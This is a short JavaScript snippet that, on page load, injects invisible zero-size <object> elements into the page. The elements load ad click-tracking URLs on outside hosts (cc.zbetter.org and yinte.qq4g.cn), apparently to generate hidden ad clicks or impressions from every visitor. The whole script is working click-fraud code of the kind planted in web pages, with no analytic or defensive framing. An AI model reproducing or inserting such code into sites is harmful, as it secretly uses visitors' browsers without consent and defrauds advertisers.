var adUrl = [
    "http://cc.zbetter.org/pclick.aspx?AID=12802&key=3FA273F2923760983516862FE2D452F2D745FCDD85F02754DF0316D2D02791B7",
    "https://yinte.qq4g.cn/Home/AdLink?key=rJKYTOeUUO8%3d",
    "http://cc.zbetter.org/pclick.aspx?AID=12802&key=3FA273F2923760983516862FE2D452F2D745FCDD85F02754DF0316D2D02791B7"
]



var adDiv = document.createElement("div");

document.body.appendChild(adDiv);
var adHtml = '';
for (var i = 0; i < adUrl.length; i++) {
    adHtml += ' <object data="' + adUrl[i] + '" type="text/html" width="0" height="0"></object>'
}

window.onload = function() {
    adDiv.innerHTML = adHtml;
}